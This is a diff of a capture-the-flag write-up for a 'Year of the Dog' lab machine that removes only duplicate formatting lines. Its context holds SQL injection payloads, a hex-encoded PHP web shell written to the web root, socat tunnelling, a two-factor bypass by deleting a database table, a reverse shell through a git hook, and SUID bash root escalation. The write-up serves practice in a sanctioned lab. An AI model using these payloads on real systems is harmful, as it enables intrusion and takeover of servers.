@@ -38,7 +38,6 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 {: .nolineno}
-{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -64,7 +63,6 @@ with <mark style="background: #ADCCFFA6;">sqli</mark> lets see how many column i
 1' ORDER BY 2--+
 ```
 {: .nolineno}
-{: .nolineno}
 
 ![Untitled](Untitled%203.png)
 
@@ -77,7 +75,6 @@ That is why I got confirmed that this database have 2 columns so lets try <mark 
 ```sql
 ' UNION SELECT 1,LOAD_FILE("/etc/passwd") -- -
 ```
-{: .nolineno}
 {: .nolineno}
 
 ![Untitled](Untitled%205.png)
@@ -94,7 +91,6 @@ This time lets try to do RFI (Remote File Inclusion) like this →
 
 'UNION SELECT 1,0x3C3F7068702073797374656D28245F524551554553545B27636D64275D293B203F3E INTO OUTFILE '/var/www/html/shell2.php'-- -
 ```
-{: .nolineno}
 {: .nolineno}
 
 with first method I got this error →
@@ -128,7 +124,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@year-of-the-dog:/var/www/html$
 ```
 {: .nolineno}
-{: .nolineno}
 
 ## SSH SHELL ⤵️
 
@@ -141,7 +136,6 @@ tcp   LISTEN  0       128                127.0.0.1:3000           0.0.0.0:*
 tcp   LISTEN  0       128                127.0.0.1:34247          0.0.0.0:*     
 www-data@year-of-the-dog:/$
 ```
-{: .nolineno}
 {: .nolineno}
 
 I also found some data related to <span style="color:#fd77f8">dylan</span> user in this file `work_analysis` :
@@ -159,14 +153,12 @@ www-data@year-of-the-dog:/home/dylan$ cat .gitconfig
 www-data@year-of-the-dog:/home/dylan$
 ```
 {: .nolineno}
-{: .nolineno}
 
 I think due to bruteforce of username:password for SSH the credetials leaked like this →
 
 ```bash
 dylan:<PASSWORD>
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now I port forworded the port 3000 for external access with socat Tool →
@@ -189,7 +181,6 @@ www-data@year-of-the-dog:/tmp$ ./socat_x86 TCP-LISTEN:2222,reuseaddr,fork TCP:12
 www-data@year-of-the-dog:/tmp$
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now lets check if the port 2222 got open on victim machine →
 
@@ -206,7 +197,6 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now lets access this site on web browser →
@@ -245,7 +235,6 @@ uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
 dylan@year-of-the-dog:~$ 
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now as sqlite in not installed on this system so I transferred its database to attackers machine.
 
@@ -261,7 +250,6 @@ conn.execute('delete from two_factor')
 conn.commit()
 conn.close()
 ```
-{: .nolineno}
 {: .nolineno}
 
 ![Untitled](Untitled%2013.png)
@@ -292,7 +280,6 @@ Password for 'http://dylan@127.0.0.1:3000': <PASSWORD>
 Everything up-to-date
 ```
 {: .nolineno}
-{: .nolineno}
 
 After executing the last part I would get the reverse shell triggered like this ⏬
 
@@ -311,7 +298,6 @@ User git may run the following commands on 42040a8f97fc:
 /data/git $
 ```
 {: .nolineno}
-{: .nolineno}
 
 So I am root now : 
 
@@ -324,7 +310,6 @@ bash: cannot set terminal process group (16): Not a tty
 bash: no job control in this shell
 bash-5.0#
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now for root in victim machine I need to transfer the victim machine bash file into the git shell or directory so that it can get the SUIDs permission from git root shell and that will work as effective SUID root for victim machine like this 🔻 
@@ -346,7 +331,6 @@ drwxr-xr-x 6 dylan dylan    4096 Sep  5  2020 queues
 drwx------ 7 dylan dylan    4096 Mar 23 05:31 sessions
 dylan@year-of-the-dog:/gitea/gitea$
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now I have to own this file as root and give it SUIDs permissions like this ⏬
@@ -401,7 +385,6 @@ drwx------    7 git      git           4096 Mar 23 05:31 sessions
 bash-5.0# 
 ```
 {: .nolineno}
-{: .nolineno}
 
 Lets use this bash to get effective SUID root permission .
 
@@ -424,7 +407,6 @@ bash-4.4# cat root.txt
 THM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}
 bash-4.4# 
 ```
-{: .nolineno}
 {: .nolineno}
 
 I am root Now !!
